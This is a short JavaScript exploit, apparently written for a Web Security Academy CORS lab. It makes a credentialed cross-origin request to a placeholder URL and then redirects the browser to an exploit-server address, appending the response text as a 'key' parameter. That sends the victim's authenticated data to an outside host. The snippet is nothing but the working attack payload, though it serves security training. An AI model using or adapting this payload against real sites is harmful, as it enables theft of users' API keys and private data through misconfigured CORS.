function cors() {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
        location.href='https://exploit-0aa9009c045dd68bc02c9e5a01aa00fa.web-security-academy.net/exploit?key='+this.responseText
        }
    };
    xhr.open("GET","URL", true);
    xhr.withCredentials = true;
    xhr.send();
}
cors()
